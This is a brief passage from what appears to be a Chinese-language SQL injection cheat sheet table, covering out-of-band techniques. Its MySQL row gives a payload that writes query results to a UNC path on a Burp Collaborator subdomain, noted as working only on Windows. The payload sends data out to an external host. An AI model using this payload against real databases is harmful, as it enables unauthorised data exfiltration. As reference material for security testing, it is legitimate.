...
`SELECT f();` |
| MySQL      | 以下技术仅在Windows系统中有效：<br/> `SELECT YOUR-QUERY-HERE INTO OUTFILE '\\\\YOUR-SUBDOMAIN-HERE.burpcollaborator.net\a'` |